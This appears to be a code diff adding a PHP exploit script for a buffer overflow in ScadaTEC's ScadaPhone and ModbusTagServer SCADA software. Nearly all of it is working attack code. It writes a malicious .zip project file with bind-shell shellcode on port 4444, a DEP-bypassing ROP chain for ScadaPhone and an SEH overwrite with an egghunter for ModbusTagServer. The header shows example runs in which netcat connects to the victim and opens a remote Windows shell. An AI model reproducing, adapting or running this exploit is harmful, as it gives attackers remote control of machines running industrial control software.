@@ -1,0 +1,179 @@
+<?php
+/*
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ScadaTEC ModbusTagServer & ScadaPhone (.zip) buffer overflow exploit (0day)
+Date: 09/09/2011
+Author: mr_me (@net__ninja)
+Vendor: http://www.scadatec.com/
+ScadaPhone Version: <= 5.3.11.1230
+ModbusTagServer Version: <= 4.1.1.81
+Tested on: Windows XP SP3 NX=AlwaysOn/OptIn
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Notes: 
+- The ScadaPhone exploit is a DEP bypass under windows XP sp3 only
+- The ModbusTagServer exploit does not bypass dep
+- To trigger this vulnerability, you must 'load' a project from a zip file.
+
+Feel free to improve it if you want. Example usage:
+
+[mr_me@neptune scadatec]$ php zip.php -t scadaphone
+[mr_me@neptune scadatec]$ nc -v 192.168.114.141 4444
+Connection to 192.168.114.141 4444 port [tcp/krb524] succeeded!
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\ScadaTEC\ScadaPhone\Projects>
+[mr_me@neptune scadatec]$ php zip.php -t modbustagserver
+[mr_me@neptune scadatec]$ nc -v 192.168.114.141 4444
+Connection to 192.168.114.141 4444 port [tcp/krb524] succeeded!
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\ScadaTEC\ModbusTagServer\Projects>
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+'The reason they call it the American Dream is because you have to be asleep 
+to believe it.' ~ George Carlin
+*/
+
+if ($argc < 3) {
+print_r("
+-----------------------------------------------------------------------------
+Usage: php ".$argv[0]." -t <software>
+software:      target software
+Example:
+php ".$argv[0]." -t scadaphone
+php ".$argv[0]." -t modbustagserver
+-----------------------------------------------------------------------------
+"); die; }
+
+function setArgs($argv){
+    $_ARG = array();
+    foreach ($argv as $arg){
+        if (ereg("--([^=]+)=(.*)", $arg, $reg)){
+            $_ARG[$reg[1]] = $reg[2];
+        }elseif(ereg("^-([a-zA-Z0-9])", $arg, $reg)){
+            $_ARG[$reg[1]] = "true";
+        }else {
+            $_ARG["input"][] = $arg;
+        }
+    }
+    return $_ARG;
+}
+
+$myArgs = setArgs($argv);
+$target = $myArgs["input"]["1"];
+
+$lf_header = "\x50\x4b\x03\x04\x14\x00\x00\x00\x00\x00\xb7\xac\xce\x34\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00";
+
+$cdf_header = "\x50\x4b\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xb7\xac\xce\x34\x00\x00\x00".
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00".
+"\x24\x00\x00\x00\x00\x00\x00\x00";
+
+$efcdr_record = "\x50\x4b\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00".
+"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00";
+
+$___offset = 4064;
+
+// bind shell on port 4444
+$___sc = "\x90\x90\x90\x90".
+"\xd9\xc7\xb8\x94\x32\x09\x43\xd9\x74\x24\xf4\x5b\x31\xc9\xb1".
+"\x56\x31\x43\x18\x83\xeb\xfc\x03\x43\x80\xd0\xfc\xbf\x40\x9d".
+"\xff\x3f\x90\xfe\x76\xda\xa1\x2c\xec\xae\x93\xe0\x66\xe2\x1f".
+"\x8a\x2b\x17\x94\xfe\xe3\x18\x1d\xb4\xd5\x17\x9e\x78\xda\xf4".
+"\x5c\x1a\xa6\x06\xb0\xfc\x97\xc8\xc5\xfd\xd0\x35\x25\xaf\x89".
+"\x32\x97\x40\xbd\x07\x2b\x60\x11\x0c\x13\x1a\x14\xd3\xe7\x90".
+"\x17\x04\x57\xae\x50\xbc\xdc\xe8\x40\xbd\x31\xeb\xbd\xf4\x3e".
+"\xd8\x36\x07\x96\x10\xb6\x39\xd6\xff\x89\xf5\xdb\xfe\xce\x32".
+"\x03\x75\x25\x41\xbe\x8e\xfe\x3b\x64\x1a\xe3\x9c\xef\xbc\xc7".
+"\x1d\x3c\x5a\x83\x12\x89\x28\xcb\x36\x0c\xfc\x67\x42\x85\x03".
+"\xa8\xc2\xdd\x27\x6c\x8e\x86\x46\x35\x6a\x69\x76\x25\xd2\xd6".
+"\xd2\x2d\xf1\x03\x64\x6c\x9e\xe0\x5b\x8f\x5e\x6e\xeb\xfc\x6c".
+"\x31\x47\x6b\xdd\xba\x41\x6c\x22\x91\x36\xe2\xdd\x19\x47\x2a".
+"\x1a\x4d\x17\x44\x8b\xed\xfc\x94\x34\x38\x52\xc5\x9a\x92\x13".
+"\xb5\x5a\x42\xfc\xdf\x54\xbd\x1c\xe0\xbe\xc8\x1a\x2e\x9a\x99".
+"\xcc\x53\x1c\x0c\x51\xdd\xfa\x44\x79\x8b\x55\xf0\xbb\xe8\x6d".
+"\x67\xc3\xda\xc1\x30\x53\x52\x0c\x86\x5c\x63\x1a\xa5\xf1\xcb".
+"\xcd\x3d\x1a\xc8\xec\x42\x37\x78\x66\x7b\xd0\xf2\x16\xce\x40".
+"\x02\x33\xb8\xe1\x91\xd8\x38\x6f\x8a\x76\x6f\x38\x7c\x8f\xe5".
+"\xd4\x27\x39\x1b\x25\xb1\x02\x9f\xf2\x02\x8c\x1e\x76\x3e\xaa".
+"\x30\x4e\xbf\xf6\x64\x1e\x96\xa0\xd2\xd8\x40\x03\x8c\xb2\x3f".
+"\xcd\x58\x42\x0c\xce\x1e\x4b\x59\xb8\xfe\xfa\x34\xfd\x01\x32".
+"\xd1\x09\x7a\x2e\x41\xf5\x51\xea\x71\xbc\xfb\x5b\x1a\x19\x6e".
+"\xde\x47\x9a\x45\x1d\x7e\x19\x6f\xde\x85\x01\x1a\xdb\xc2\x85".
+"\xf7\x91\x5b\x60\xf7\x06\x5b\xa1";
+
+if(strcmp($target,"scadaphone") === 0){
+
+	// add esp 418; retn
+	$___pivot = "\x0b\x33\xc6\x01";
+	$___jmp = "\xeb\x06HI";
+
+	$___rop = "";
+	$___rop .=
+	"\x1c\x05\x03\x10".	// xor edx,edx; retn
+	"\xa2\xce\x02\x10".	// pop eax; retn
+	"\xf4\x11\x6e\x6d".	// &VirtualProtect
+	"\xa9\x4e\x01\x10".	// mov eax,[eax]; retn
+	"\xd7\xbf\x01\x10".	// push eax; mov eax,[edx*4+10036948]; and eax,esi; pop esi; pop ebx; retn
+	"\xc0\xff\xff\xff".	// special sauce ----------------------------------------------^^
+	"\x1e\xe0\x02\x10".	// add edx,ebx; pop ebx; retn 10
+	"LOLZ".			// junk
+	"\xea\x37\xc6\x01".	// neg edx; neg eax; sbb edx,0; pop ebx; retn 10
+	"CAFEBABE".		// junk
+	"CAFEBABE".		// junk
+	"\xbf\x52\xc6\x01".	// .data writable ------------------^^
+	"\xa2\xce\x02\x10".	// pop eax; retn
+	"CAFEBABE".		// junk
+	"CAFEBABE".		// junk
+	"\x17\x32\xc6\x01".	// ptr to 0x400 
+	"\xa9\x4e\x01\x10".	// mov eax,[eax]; retn
+	"\xe4\x85\x02\x10".	// xchg eax,ebx; add dl,[eax]; mov [eax+8],11; mov eax,13; retn
+	"\xa2\xce\x02\x10".	// pop eax; retn
+	"\x90\x90\x90\x90".	// nops
+	"\x53\x54\x10\x10".	// pop edi; retn
+	"\x54\x54\x10\x10".	// retn
+	"\x01\xec\x02\x10".	// pop ecx; retn
+	"\xc0\x52\xc6\x01".	// .data writable
+	"\x03\xc0\x17\x10".	// pop ebp; retn
+	"\x44\xcb\x2b\x10".	// ptr to 'push esp; ret'
+	"\xb7\xc9\x27\x10";	// pushad; retn
+
+	$___exploit = str_repeat("\x41",57).
+	$___rop;
+	$___exploit .= str_repeat("\x90",277-strlen($___exploit)).
+	$___jmp.
+	$___pivot.
+	$___sc;
+	$___exploit .= str_repeat("\x41",$___offset-strlen($___exploit))."\x1e\x74\x78\x74";
+
+}else if(strcmp($target,"modbustagserver") === 0) {
+
+	$__hunter = "\x66\x81\xcA\xff\x0f\x42\x52\x6a".
+	"\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8".
+    	"OMFG".
+    	"\x8b\xfa\xaf\x75\xeA\xaf\x75\xe7\xff\xe7";
+
+	$___nseh = "\xeb\xceHI";
+
+	// pop esi; pop ebx; retn
+	$___seh = "\xac\x14\x40\x00"; 
+
+	$___exploit = str_repeat("\x41",229).
+	$__hunter.
+	str_repeat("\x44",48-strlen($__hunter)).
+	$___nseh.
+	$___seh.
+	str_repeat("\x44",100).
+	"OMFGOMFG".
+	$___sc;
+	$___exploit .= 
+	str_repeat("\x41",$___offset-strlen($___exploit))."\x1e\x74\x78\x74";
+
+}else{
+	exit(0);
+}
+
+$_____boom = $lf_header.$___exploit.$cdf_header.$___exploit.$efcdr_record;
+file_put_contents("scadatec.zip",$_____boom);
+?>
